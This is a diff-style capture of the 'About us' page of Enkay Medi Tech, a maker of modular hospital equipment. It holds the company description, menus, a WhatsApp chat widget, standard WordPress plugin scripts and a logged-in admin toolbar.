+                        <aside id="apus_socials_widget-2" class="widget widget_apus_socials_widget"><ul class="social list-unstyled list-inline bo-sicolor">
+                    <li>
+                    <a href="#" class="facebook">
+                        <i class="fa fa-facebook bo-social-facebook">&nbsp;</i><span class="hidden">Facebook</span>
+                    </a>
+                </li>
+                    <li>
+                    <a href="#" class="twitter">
+                        <i class="fa fa-twitter bo-social-twitter">&nbsp;</i><span class="hidden">Twitter</span>
+                    </a>
+                </li>
+                    <li>
+                    <a href="#" class="google-plus">
+                        <i class="fa fa-google-plus bo-social-google-plus">&nbsp;</i><span class="hidden">Google</span>
+                    </a>
+                </li>
+                    <li>
+                    <a href="#" class="linkedin">
+                        <i class="fa fa-linkedin bo-social-linkedin">&nbsp;</i><span class="hidden">LinkedIn</span>
+                    </a>
+                </li>
+    </ul></aside>                    </div>
+                            </div>
+        </div> 
+	</div>
+
+	<div class="header-main clearfix">
+        <div class="container">
+            <div class="header-center-inner clearfix">
+                <div class="row">
+                    <!-- LOGO -->
+                    <div class="logo-in-theme col-md-2">
+                        
+    <div class="logo">
+        <a href="https://enkaymeditech.com/">
+            <img src="https://enkaymeditech.com/wp-content/uploads/2024/08/New-Project-1.png" alt="Enkay Medi Tech">
+        </a>
+    </div>
+                    </div>
+                    <!-- //LOGO -->
+                    <div class="logo-in-theme col-md-10 hidden-sm hidden-xs">
+
+                        <div class="pull-right header-setting">
+                                                        <div class="apus-search pull-right">
+                                                           </div>
+                        </div>
+
+
+                                                    <div class="pull-right site-header-mainmenu ">
+                                <nav data-duration="400" class="hidden-xs hidden-sm apus-megamenu slide animate navbar" role="navigation">
+                                <div class="collapse navbar-collapse"><ul id="primary-menu" class="nav navbar-nav megamenu"><li class="menu-item-1061 aligned-left"><a href="https://enkaymeditech.com/">Home</a></li>
+<li class="active menu-item-960 aligned-left"><a href="https://enkaymeditech.com/about-us/">About us</a></li>
+<li class="menu-item-1228 aligned-left"><a href="https://enkaymeditech.com/why-we-choose/">Why We Choose</a></li>
+<li class="dropdown menu-item-1431 aligned-left"><a href="#" class="dropdown-toggle"  data-hover="dropdown" data-toggle="dropdown">Product <b class="caret"></b></a>
+<ul class="dropdown-menu">
+	<li class="menu-item-1390 aligned-left"><a href="https://enkaymeditech.com/bed-head-panel/">Bed Head Panel</a></li>
+	<li class="menu-item-1333 aligned-left"><a href="https://enkaymeditech.com/blood-bank/">Blood Bank</a></li>
+	<li class="menu-item-1281 aligned-left"><a href="https://enkaymeditech.com/track-curtain/">Cubicle Track System</a></li>
+	<li class="menu-item-1334 aligned-left"><a href="https://enkaymeditech.com/door/">Door</a></li>
+	<li class="menu-item-1284 aligned-left"><a href="https://enkaymeditech.com/i-v-tree/">I V Tree System</a></li>
+	<li class="menu-item-1372 aligned-left"><a href="https://enkaymeditech.com/ivf-lab-3/">IVF Lab</a></li>
+	<li class="menu-item-1223 aligned-left"><a href="https://enkaymeditech.com/modular-operation-theater/">Modular Operation Theater</a></li>
+	<li class="menu-item-1283 aligned-left"><a href="https://enkaymeditech.com/medical-gas-pipeline-system/">Medical Gas Pipeline System</a></li>
+	<li class="menu-item-1365 aligned-left"><a href="https://enkaymeditech.com/medical-wall-mounts/">Medical Wall Mounts</a></li>
+	<li class="menu-item-1282 aligned-left"><a href="https://enkaymeditech.com/nurse-call-system/">Nurse Call &#038; Queue Management System</a></li>
+	<li class="menu-item-1373 aligned-left"><a href="https://enkaymeditech.com/scrub-station/">Scrub Station</a></li>
+	<li class="menu-item-1285 aligned-left"><a href="https://enkaymeditech.com/wall-protection-systems/">Wall Protection System</a></li>
+</ul>
+</li>
+<li class="menu-item-1174 aligned-left"><a href="https://enkaymeditech.com/contact-us/">Contact us</a></li>
+</ul></div>                                </nav>
+                            </div>
+                        
+
+                    </div>
+                </div>
+            </div>
+        </div>
+	</div>
+</header>
+	<div id="apus-main-content">
+<section id="apus-breadscrumb" class="apus-breadscrumb" style="background-image:url('http://localhost/enkay/wp-content/uploads/2024/08/banner3.jpg')"><div class="container"><div class="p-relative breadscrumb-inner"><ol class="breadcrumb"><li><a href="https://enkaymeditech.com">Home</a>  </li> <li class="active">About us</li></ol><h2 class="bread-title">About us</h2></div></div></section>
+<section id="main-container" class="container-fluid inner">
+	<div class="row">
+				<div id="main-content" class="main-page clearfix  ">
+			<main id="main" class="site-main" role="main">
+
+				<div class="wpb-content-wrapper"><div class="vc_row row-wrapper wpb_row vc_row-fluid vc_custom_1463473391784"><div class="container"><div class="row"><div class="vc_fluid col-md-12"><div class="vc_column-inner "><div class="wpb_wrapper">
+<div class="widget widget-text-heading  style5">
+	        <h3 class="widget-title title-md"  style="color: #323232;">
+           <span>About Enkay Medi Tech</span>
+        </h3>
+                <div class="description">
+            Enkay Medi Tech is a professional manufacturer integrated with the development, design, and production of modular equipment. The products include a Modular Operation Theatre, Modular I.C.U., Modular I.V.F. Lab, Medical Gas Pipeline System &amp; C.S.S.D. System. We have established modern machines and modern corporate systems.</p>
+<p>We have a decent manufacturing unit with the required space and good machines that are necessary for a light engineering unit, as our employees are excellent team of technically trained people, and we have a good volume production capability. We do have a very effective quality control check through procurement to finished products, among others.</p>
+<p>We have a R&amp;D team that works on various product development projects. We have set a modest target in R&amp;D for ourselves. In which primarily we target our products to match those of leading global brands in every aspect of it.</p>
+<p>We are committed to fair and ethical business practices and care for the environment. You will experience transparency in our conduct. We have a program aimed at enabling our prospective customers to make informed purchasing decisions. We are dedicated to knowledge and tutorials on features, specifications, and quality. Warranty and replacement policy. Spare parts, Annual Maintenance Contracts (AMC), general terms and conditions of transactions, customer services, among other programs.</p>
+<p>We are experts in production, from raw materials to finished products. Our mission is to provide the best-quality products. Prompt service and professional consultation that can fully satisfy customers.</p>
+<p>We believe that our client's satisfaction is our success. We believe in establishing long-term business relationships with customers. Our major customers consist of government hospitals, corporate hospitals, and domestic and overseas dealers.        </div>
+        </div></div></div></div></div></div></div>
+</div>			</main><!-- .site-main -->
+
+		</div><!-- .content-area -->
+
+				
+				
+	</div>
+</section>
+
+	</div><!-- .site-content -->
+
+	<footer id="apus-footer" class="apus-footer" role="contentinfo">
+					<div class="vc_row row-wrapper wpb_row vc_row-fluid apus-f vc_custom_1463215803546 vc_row-has-fill"><div class="container"><div class="row">
+	<div class="wpb_text_column wpb_content_element" >
+		<div class="wpb_wrapper">
+			<p><a href="https://www.facebook.com/profile.php?id=61566373174043&is_tour_completed" target="blank" rel="noopener"><i class="fa fa-facebook"></i></a> <a href="#"><i class="fa fa-linkedin"></i></a> <a href="#"><i class="fa fa-instagram"></i></a> </p>
+
+		</div>
+	</div>
+</div></div></div><div class="vc_row row-wrapper wpb_row vc_row-fluid apus-copyright vc_custom_1463215803546 vc_row-has-fill"><div class="container"><div class="row">
+	<div class="wpb_text_column wpb_content_element" >
+		<div class="wpb_wrapper">
+			<p>© Copyright <b> Enkay Medi Tech</b> All Rights Reserved | <a href="privacy-policy-2">privacy-policy</a> | <a href="terms-&amp;-conditions">Terms &amp; Conditions</a> </p>
+
+		</div>
+	</div>
+</div></div></div>				
+	</footer><!-- .site-footer -->
+
+			<a href="#" id="back-to-top">
+			<i class="fa fa-angle-up"></i>
+		</a>
+	
+</div><!-- .site -->
+
+
+
+		<script>
+			window.RS_MODULES = window.RS_MODULES || {};
+			window.RS_MODULES.modules = window.RS_MODULES.modules || {};
+			window.RS_MODULES.waiting = window.RS_MODULES.waiting || [];
+			window.RS_MODULES.defered = true;
+			window.RS_MODULES.moduleWaiting = window.RS_MODULES.moduleWaiting || {};
+			window.RS_MODULES.type = 'compiled';
+		</script>
+		<script type="text/html" id="wpb-modifications"> window.wpbCustomElement = 1; </script>		<div 
+			class="qlwapp"
+			style="--qlwapp-scheme-font-family:inherit;--qlwapp-scheme-font-size:18px;--qlwapp-scheme-icon-size:60px;--qlwapp-scheme-icon-font-size:24px;--qlwapp-scheme-box-max-height:400px;--qlwapp-scheme-box-message-word-break:break-all;--qlwapp-button-notification-bubble-animation:none;"
+			data-contacts="[{&quot;id&quot;:0,&quot;order&quot;:1,&quot;active&quot;:1,&quot;chat&quot;:1,&quot;avatar&quot;:&quot;https:\/\/www.gravatar.com\/avatar\/00000000000000000000000000000000&quot;,&quot;type&quot;:&quot;phone&quot;,&quot;phone&quot;:&quot;918588945981&quot;,&quot;group&quot;:&quot;https:\/\/chat.whatsapp.com\/EQuPUtcPzEdIZVlT8JyyNw&quot;,&quot;firstname&quot;:&quot;John&quot;,&quot;lastname&quot;:&quot;Doe&quot;,&quot;label&quot;:&quot;Support&quot;,&quot;message&quot;:&quot;&quot;,&quot;timefrom&quot;:&quot;00:00&quot;,&quot;timeto&quot;:&quot;00:00&quot;,&quot;timezone&quot;:&quot;UTC+0&quot;,&quot;visibility&quot;:&quot;readonly&quot;,&quot;timedays&quot;:[],&quot;display&quot;:{&quot;entries&quot;:{&quot;post&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;page&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;apus_brand&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;apus_testimonial&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]}},&quot;taxonomies&quot;:{&quot;category&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;post_tag&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]}},&quot;target&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;devices&quot;:&quot;all&quot;}}]"
+			data-display="{&quot;devices&quot;:&quot;all&quot;,&quot;entries&quot;:{&quot;post&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;page&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;apus_brand&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;apus_testimonial&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]}},&quot;taxonomies&quot;:{&quot;category&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]},&quot;post_tag&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]}},&quot;target&quot;:{&quot;include&quot;:1,&quot;ids&quot;:[]}}"
+			data-button="{&quot;layout&quot;:&quot;button&quot;,&quot;box&quot;:&quot;no&quot;,&quot;position&quot;:&quot;bottom-right&quot;,&quot;text&quot;:&quot;&quot;,&quot;message&quot;:&quot;&quot;,&quot;icon&quot;:&quot;qlwapp-whatsapp-icon&quot;,&quot;type&quot;:&quot;phone&quot;,&quot;phone&quot;:&quot;918588945981&quot;,&quot;group&quot;:&quot;https:\/\/chat.whatsapp.com\/EQuPUtcPzEdIZVlT8JyyNw&quot;,&quot;developer&quot;:&quot;no&quot;,&quot;rounded&quot;:&quot;yes&quot;,&quot;timefrom&quot;:&quot;00:00&quot;,&quot;timeto&quot;:&quot;00:00&quot;,&quot;timedays&quot;:[],&quot;timezone&quot;:&quot;UTC+0&quot;,&quot;visibility&quot;:&quot;readonly&quot;,&quot;animation_name&quot;:&quot;&quot;,&quot;animation_delay&quot;:&quot;&quot;,&quot;whatsapp_link_type&quot;:&quot;web&quot;,&quot;notification_bubble&quot;:&quot;none&quot;,&quot;notification_bubble_animation&quot;:&quot;none&quot;}"
+			data-box="{&quot;enable&quot;:&quot;yes&quot;,&quot;auto_open&quot;:&quot;no&quot;,&quot;auto_delay_open&quot;:1000,&quot;lazy_load&quot;:&quot;no&quot;,&quot;allow_outside_close&quot;:&quot;no&quot;,&quot;header&quot;:&quot;&lt;h3 style=\&quot;\n\t\t\t\t\t\t\t\t\tfont-size: 26px;\n\t\t\t\t\t\t\t\t\tfont-weight: bold;\n\t\t\t\t\t\t\t\t\tmargin: 0 0 0.25em 0;\n\t\t\t\t\t\t\t\t\&quot;&gt;Hello!&lt;\/h3&gt;\n\t\t\t\t\t\t\t\t&lt;p style=\&quot;\n\t\t\t\t\t\t\t\t\tfont-size: 14px;\n\t\t\t\t\t\t\t\t\&quot;&gt;Click one of our contacts below to chat on WhatsApp&lt;\/p&gt;&quot;,&quot;footer&quot;:&quot;&lt;p style=\&quot;text-align: start;\&quot;&gt;Need help? Our team is just a message away&lt;\/p&gt;&quot;,&quot;response&quot;:&quot;Write a response&quot;,&quot;consentMessage&quot;:&quot;I accept cookies and privacy policy.&quot;,&quot;consentEnabled&quot;:0}"
+			data-scheme="{&quot;font_family&quot;:&quot;inherit&quot;,&quot;font_size&quot;:&quot;18&quot;,&quot;icon_size&quot;:&quot;60&quot;,&quot;icon_font_size&quot;:&quot;24&quot;,&quot;box_max_height&quot;:&quot;400&quot;,&quot;brand&quot;:&quot;&quot;,&quot;text&quot;:&quot;&quot;,&quot;link&quot;:&quot;&quot;,&quot;message&quot;:&quot;&quot;,&quot;label&quot;:&quot;&quot;,&quot;name&quot;:&quot;&quot;,&quot;contact_role_color&quot;:&quot;&quot;,&quot;contact_name_color&quot;:&quot;&quot;,&quot;contact_availability_color&quot;:&quot;&quot;,&quot;box_message_word_break&quot;:&quot;break-all&quot;}"
+		>
+					</div>
+		<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/hoverintent-js.min.js?ver=2.2.1" id="hoverintent-js-js"></script>
+<script type="text/javascript" id="admin-bar-js-before">
+/* <![CDATA[ */
+( function() {
+				function wpforms_admin_bar_menu_init() {
+					var template = document.getElementById( 'tmpl-wpforms-admin-menubar-data' ),
+						notifications = document.getElementById( 'wp-admin-bar-wpforms-notifications' );
+
+					if ( ! template ) {
+						return;
+					}
+
+					if ( ! notifications ) {
+						var menu = document.getElementById( 'wp-admin-bar-wpforms-menu-default' );
+
+						if ( ! menu ) {
+							return;
+						}
+
+						menu.insertAdjacentHTML( 'afterBegin', template.innerHTML );
+					} else {
+						notifications.insertAdjacentHTML( 'afterend', template.innerHTML );
+					}
+				};
+				document.addEventListener( 'DOMContentLoaded', wpforms_admin_bar_menu_init );
+			}() );
+//# sourceURL=admin-bar-js-before
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/admin-bar.min.js?ver=6.9" id="admin-bar-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/dist/hooks.min.js?ver=dd5603f07f9220ed27f1" id="wp-hooks-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/dist/i18n.min.js?ver=c26c3dc7bed366793375" id="wp-i18n-js"></script>
+<script type="text/javascript" id="wp-i18n-js-after">
+/* <![CDATA[ */
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+//# sourceURL=wp-i18n-js-after
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/plugins/contact-form-7/includes/swv/js/index.js?ver=6.1.4" id="swv-js"></script>
+<script type="text/javascript" id="contact-form-7-js-before">
+/* <![CDATA[ */
+var wpcf7 = {
+    "api": {
+        "root": "https:\/\/enkaymeditech.com\/wp-json\/",
+        "namespace": "contact-form-7\/v1"
+    }
+};
+//# sourceURL=contact-form-7-js-before
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=6.1.4" id="contact-form-7-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/plugins/revslider/public/assets/js/rbtools.min.js?ver=6.6.20" defer async id="tp-tools-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/plugins/revslider/public/assets/js/rs6.min.js?ver=6.6.20" defer async id="revmin-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/skip-link-focus-fix.js?ver=20141010" id="drone-skip-link-focus-fix-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/bootstrap.min.js?ver=20150330" id="bootstrap-script-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/owl.carousel.min.js?ver=2.0.0" id="drone-owl-carousel-script-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/woocommerce.js?ver=20150330" id="drone-woocommerce-script-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/jquery.countdownTimer.min.js?ver=20150315" id="countdown-timer-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/perfect-scrollbar.jquery.min.js?ver=20150315" id="perfect-scrollbar-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/jquery.fancybox.js?ver=20150315" id="fancybox-js-js"></script>
+<script type="text/javascript" id="drone-script-js-extra">
+/* <![CDATA[ */
+var drone_ajax = {"ajaxurl":"https://enkaymeditech.com/wp-admin/admin-ajax.php"};
+//# sourceURL=drone-script-js-extra
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/themes/drone/js/functions.js?ver=20150330" id="drone-script-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/plugins/js_composer/assets/js/dist/js_composer_front.min.js?ver=7.7.2" id="wpb_composer_front_js-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/dist/vendor/react.min.js?ver=18.3.1.1" id="react-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/dist/vendor/react-dom.min.js?ver=18.3.1.1" id="react-dom-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/dist/escape-html.min.js?ver=6561a406d2d232a6fbd2" id="wp-escape-html-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-includes/js/dist/element.min.js?ver=6a582b0c827fa25df3dd" id="wp-element-js"></script>
+<script type="text/javascript" src="https://enkaymeditech.com/wp-content/plugins/wp-whatsapp-chat/build/frontend/js/index.js?ver=2c4ffd8ce6a4563d774f" id="qlwapp-frontend-js"></script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://enkaymeditech.com/wp-includes/js/wp-emoji-release.min.js?ver=6.9"}}
+</script>
+<script type="module">
+/* <![CDATA[ */
+/*! This file is auto-generated */
+const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
+//# sourceURL=https://enkaymeditech.com/wp-includes/js/wp-emoji-loader.min.js
+/* ]]> */
+</script>
+<script></script>		<script>
+			function rs_adminBarToolBarTopFunction() {
+				if(jQuery('#wp-admin-bar-revslider-default').length > 0 && jQuery('rs-module-wrap').length > 0){
+					var aliases = new Array();
+					jQuery('rs-module-wrap').each(function(){
+						aliases.push(jQuery(this).data('alias'));
+					});
+					
+					if(aliases.length > 0){
+						jQuery('#wp-admin-bar-revslider-default li').each(function(){
+							var li = jQuery(this),
+								t = li.find('.ab-item .rs-label').data('alias'); //text()
+							t = t!==undefined && t!==null ? t.trim() : t;
+							if(jQuery.inArray(t,aliases)!=-1){
+							}else{
+								li.remove();
+							}
+						});
+					}
+				}else{
+					jQuery('#wp-admin-bar-revslider').remove();
+				}
+			}
+			var adminBarLoaded_once = false
+			if (document.readyState === "loading") 
+				document.addEventListener('readystatechange',function(){
+					if ((document.readyState === "interactive" || document.readyState === "complete") && !adminBarLoaded_once) {
+						adminBarLoaded_once = true;
+						rs_adminBarToolBarTopFunction()
+					}
+				});
+			else {
+				adminBarLoaded_once = true;
+				rs_adminBarToolBarTopFunction();
+			}
+		</script>
+		<script type="text/javascript">
+/* <![CDATA[ */
+
+		(function() {
+			var request, b = document.body, c = 'className', cs = 'customize-support', rcs = new RegExp('(^|\\s+)(no-)?'+cs+'(\\s+|$)');
+
+				request = true;
+	
+			b[c] = b[c].replace( rcs, ' ' );
+			// The customizer requires postMessage and CORS (if the site is cross domain).
+			b[c] += ( window.postMessage && request ? ' ' : ' no-' ) + cs;
+		}());
+	
+//# sourceURL=wp_customize_support_script
+/* ]]> */
+</script>
+		<div id="wpadminbar" class="nojq nojs">
+							<a class="screen-reader-shortcut" href="#wp-toolbar" tabindex="1">Skip to toolbar</a>
+						<div class="quicklinks" id="wp-toolbar" role="navigation" aria-label="Toolbar">
+				<ul role='menu' id='wp-admin-bar-root-default' class="ab-top-menu"><li role='group' id='wp-admin-bar-wp-logo' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/about.php'><span class="ab-icon" aria-hidden="true"></span><span class="screen-reader-text">About WordPress</span></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='About WordPress' id='wp-admin-bar-wp-logo-default' class="ab-submenu"><li role='group' id='wp-admin-bar-about'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/about.php'>About WordPress</a></li><li role='group' id='wp-admin-bar-contribute'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/contribute.php'>Get Involved</a></li></ul><ul role='menu' aria-label='About WordPress' id='wp-admin-bar-wp-logo-external' class="ab-sub-secondary ab-submenu"><li role='group' id='wp-admin-bar-wporg'><a class='ab-item' role="menuitem" href='https://wordpress.org/'>WordPress.org</a></li><li role='group' id='wp-admin-bar-documentation'><a class='ab-item' role="menuitem" href='https://wordpress.org/documentation/'>Documentation</a></li><li role='group' id='wp-admin-bar-learn'><a class='ab-item' role="menuitem" href='https://learn.wordpress.org/'>Learn WordPress</a></li><li role='group' id='wp-admin-bar-support-forums'><a class='ab-item' role="menuitem" href='https://wordpress.org/support/forums/'>Support</a></li><li role='group' id='wp-admin-bar-feedback'><a class='ab-item' role="menuitem" href='https://wordpress.org/support/forum/requests-and-feedback'>Feedback</a></li></ul></div></li><li role='group' id='wp-admin-bar-site-name' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/'>Enkay Medi Tech</a><div class="ab-sub-wrapper"><ul role='menu' aria-label='Enkay Medi Tech' id='wp-admin-bar-site-name-default' class="ab-submenu"><li role='group' id='wp-admin-bar-dashboard'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/'>Dashboard</a></li><li role='group' id='wp-admin-bar-plugins'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/plugins.php'>Plugins</a></li></ul><ul role='menu' aria-label='Enkay Medi Tech' id='wp-admin-bar-appearance' class="ab-submenu"><li role='group' id='wp-admin-bar-themes'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/themes.php'>Themes</a></li><li role='group' id='wp-admin-bar-widgets'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/widgets.php'>Widgets</a></li><li role='group' id='wp-admin-bar-menus'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/nav-menus.php'>Menus</a></li><li role='group' id='wp-admin-bar-background' class="hide-if-customize"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/themes.php?page=custom-background'>Background</a></li><li role='group' id='wp-admin-bar-header' class="hide-if-customize"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/themes.php?page=custom-header'>Header</a></li></ul></div></li><li role='group' id='wp-admin-bar-customize' class="hide-if-no-customize"><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/customize.php?url=https%3A%2F%2Fenkaymeditech.com%2Fabout-us%2F'>Customize</a></li><li role='group' id='wp-admin-bar-_options'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=_options'><span class="ab-icon dashicons-portfolio"></span>Drone Options</a></li><li role='group' id='wp-admin-bar-updates'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/update-core.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label" aria-hidden="true">12</span><span class="screen-reader-text updates-available-text">12 updates available</span></a></li><li role='group' id='wp-admin-bar-comments'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/edit-comments.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label awaiting-mod pending-count count-19" aria-hidden="true">19</span><span class="screen-reader-text comments-in-moderation-text">19 Comments in moderation</span></a></li><li role='group' id='wp-admin-bar-new-content' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/post-new.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label">New</span></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='New' id='wp-admin-bar-new-content-default' class="ab-submenu"><li role='group' id='wp-admin-bar-new-post'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post-new.php'>Post</a></li><li role='group' id='wp-admin-bar-new-media'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/media-new.php'>Media</a></li><li role='group' id='wp-admin-bar-new-page'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post-new.php?post_type=page'>Page</a></li><li role='group' id='wp-admin-bar-new-wlshowcase'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post-new.php?post_type=wlshowcase'>Logo</a></li><li role='group' id='wp-admin-bar-new-wlshowcasesc'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post-new.php?post_type=wlshowcasesc'>Shortcode</a></li><li role='group' id='wp-admin-bar-new-apus_footer'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post-new.php?post_type=apus_footer'>Footer</a></li><li role='group' id='wp-admin-bar-new-apus_brand'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post-new.php?post_type=apus_brand'>Brand</a></li><li role='group' id='wp-admin-bar-new-apus_testimonial'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post-new.php?post_type=apus_testimonial'>Testimonial</a></li><li role='group' id='wp-admin-bar-new-apus_megamenu'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post-new.php?post_type=apus_megamenu'>Megamenu Profile</a></li><li role='group' id='wp-admin-bar-new-user'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/user-new.php'>User</a></li><li role='group' id='wp-admin-bar-wpforms'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-builder'>WPForms</a></li></ul></div></li><li role='group' id='wp-admin-bar-edit'><a class='ab-item' role="menuitem" href='https://enkaymeditech.com/wp-admin/post.php?post=626&#038;action=edit'>Edit Page</a></li><li role='group' id='wp-admin-bar-wpforms-menu' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://enkaymeditech.com/wp-admin/admin.php?page=wpforms-overview'>WPForms</a><div class="ab-sub-wrapper"><ul role='menu' id='wp-admin-bar-wpforms-menu-default' class="ab-submenu"><li role='group' id='wp-admin-bar-wpforms-forms'><a 